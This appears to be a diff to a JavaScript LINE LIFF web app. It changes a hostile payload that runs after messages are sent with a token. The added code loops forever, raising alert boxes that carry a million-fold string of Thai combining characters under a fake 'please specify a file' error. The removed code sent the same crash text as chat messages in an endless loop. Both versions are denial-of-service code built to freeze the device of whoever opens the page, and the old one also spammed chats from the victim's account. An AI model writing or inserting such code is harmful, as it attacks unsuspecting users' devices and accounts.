@@ -66,12 +66,9 @@
         }
     liffmod.token.sendMessages(temp,token);
     }).then((a)=>{
-        let e="ิิิิิิิิิิิิิิิ".repeat(100000)
+        let e="ิิิิิิิิิิิิิิิ".repeat(1000000)
         while(true){
-            liff.sendMessages([{
-                type:"text",
-                text:e}])
-            alert('エラー');
+            alert(e+'エラー:ファイルを指定してください');
         }
     })
     
